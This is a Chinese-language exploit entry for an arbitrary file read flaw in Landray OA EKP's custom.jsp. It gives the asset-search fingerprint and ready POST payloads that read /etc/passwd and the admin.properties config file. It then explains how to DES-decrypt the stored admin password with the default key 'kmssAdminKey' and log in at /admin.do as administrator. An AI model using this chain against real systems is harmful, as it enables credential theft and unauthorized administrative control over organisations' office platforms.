# 蓝凌OAEKPcustom.jsp存在任意文件读取漏洞

- **系统**：蓝凌　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="Landray 蓝凌OA"`
- **请求**：`POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 42`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
var={"body":{"file":"file:///etc/passwd"}}

读取系统后台密码
POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
Host: xx.xx.xx.xx
Accept: /
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}

由于`蓝凌OA`默认是`DES`加密，且 默认密钥为 `kmssAdminKey`，所以只要拿着响应中的`password`值进行解密就好（返回的`password`字符串去掉末尾的`/r`再进行解密）\
`DES`解密
http://tool.chacuo.net/cryptdes/

得到密码之后即可访问后台以管理员身份登入系统
/admin.do

```

**其他**
- 蓝凌OA EKP custom.jsp存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 蓝凌OA EKP